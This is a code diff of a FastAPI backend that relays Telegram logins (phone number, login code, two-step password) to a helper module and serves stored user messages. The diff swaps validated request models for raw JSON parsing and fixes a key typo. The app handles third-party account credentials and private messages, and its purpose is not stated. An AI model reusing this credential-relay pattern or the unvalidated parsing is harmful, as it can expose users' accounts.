@@ -4,7 +4,7 @@ from typing import Optional, Dict, List
 from datetime import datetime
 import json
 import re
-from telegram_sender import submit_code, initiate_login, store_messages, submit_2fa_password
+from telegram_sender import submit_code, initiate_login, store_messages, submit_password
 
 
 app = FastAPI()
@@ -37,17 +37,6 @@ class Message(BaseModel):
 
 class MessagesResponse(BaseModel):
     messages: Dict[str, Dict[str, List[Message]]]
-
-class LoginRequest(BaseModel):
-    phone: str
-
-class CodeRequest(BaseModel):
-    phone: str
-    code: str
-
-class TwoFactorRequest(BaseModel):
-    phone: str
-    password: str
 
 def remove_emoji(text: str) -> str:
     """Remove emoji characters from text"""
@@ -136,7 +125,7 @@ async def read_user(user_id: int):
                 msg = json.loads(msg)
             message_objects.append(Message(
                 sender=remove_emoji(msg.get("name", msg.get("sender", ""))),
-                text=remove_emoji(msg.get("messag", msg.get("message", ""))),
+                text=remove_emoji(msg.get("text", msg.get("message", ""))),
                 date=datetime.fromisoformat(msg.get("date", datetime.now().isoformat()))
             ))
         except Exception as e:
@@ -163,16 +152,24 @@ async def auth(phone_number: str):
         raise HTTPException(status_code=400, detail="Invalid phone number")
 
 @app.post("/start-login")
-async def start_login(request: LoginRequest):
-    result = await initiate_login(request.phone)
+async def start_login(request: Request):
+    data = await request.json()
+    phone = data["phone"]
+    result = await initiate_login(phone)
     return result
 
 @app.post("/submit-code")
-async def submit_code_route(request: CodeRequest):
-    result = await submit_code(request.phone, request.code)
+async def submit_code_route(request: Request):
+    data = await request.json()
+    phone = data["phone"]
+    code = data["code"]
+    result = await submit_code(phone, code)
     return result
 
-@app.post("/submit-2fa")
-async def submit_2fa_route(request: TwoFactorRequest):
-    result = await submit_2fa_password(request.phone, request.password)
+@app.post("/submit-password")
+async def submit_password_route(request: Request):
+    data = await request.json()
+    phone = data["phone"]
+    password = data["password"]
+    result = await submit_password(phone, password)
     return result
